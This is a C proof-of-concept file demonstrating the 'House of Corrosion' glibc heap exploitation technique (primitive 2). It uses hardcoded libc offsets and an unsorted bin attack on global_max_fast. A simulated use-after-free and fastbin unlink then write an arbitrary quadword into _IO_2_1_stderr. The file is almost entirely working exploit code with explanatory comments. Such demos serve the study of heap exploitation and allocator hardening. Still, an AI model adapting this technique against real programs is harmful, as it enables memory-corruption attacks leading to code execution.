/*
 * House of Corrosion
 * Primitive 2:
 * From primitive 1, freed chunk is linked to somewhere exceeding the original fastbinsY.
 * In primitive 2, exercise UAF against the freed chunk, overwrite fake fd to the chunk.
 * Then unlink the freed chunk via malloc, which will make the fake fd written
 * to the address which is interpreted as (fake) fastbinsY.
 *
 * Overwrite quadword with arbitrary data.
 */


#include <stdio.h>
#include <stdlib.h>
#include <malloc.h>
#include <assert.h>


#define CHUNK_SIZE(delta) \
    ((unsigned long)(delta) * 2 + 0x20)


unsigned long offset_gmf = 0x3ed940;
unsigned long offset_main_arena = 0x3ebc40;
unsigned long offset_io_2_1_stdin = 0x3eba00;
unsigned long offset_io_2_1_stderr = 0x3ec680;
unsigned long offset_unsorted_bin = 0x3ebca0;
unsigned long offset_fastbinsY = 0x3ebc50;


unsigned long chunk_size(unsigned long delta) {
    assert(delta % 0x8 == 0);
    return delta * 2 + 0x20;
}


unsigned long malloc_size(unsigned long delta) {
    return chunk_size(delta) - 0x8;
}


int main(void) {
    unsigned long addr_libc = (unsigned long)stdin - offset_io_2_1_stdin;

    unsigned long stderr_size = malloc_size((unsigned long)stderr - (addr_libc + offset_fastbinsY));

    unsigned long *uba = malloc(0x418);
    unsigned long *pc0 = malloc(0x18);
    unsigned long *src = malloc(stderr_size);
    unsigned long *pc1 = malloc(0x18);

    free(uba);
    // 4 bit guess is required but cheat for now
    // overwrite bk
    uba[1] = addr_libc + offset_gmf - 0x10;

    // carry out unsorted bin attack
    malloc(0x418);

    // link chunk to _IO_2_1_stderr
    free(src);

    // Simulate UAF
    // Overwrite fd
    *src = 0xdeadbeefcafebabe;
    // Unlink freed chunk from fastbins
    // Overwritten fd should be written to the fake fastbins link header (_IO_2_1_stderr in this example)
    malloc(stderr_size);

    return 0;
}
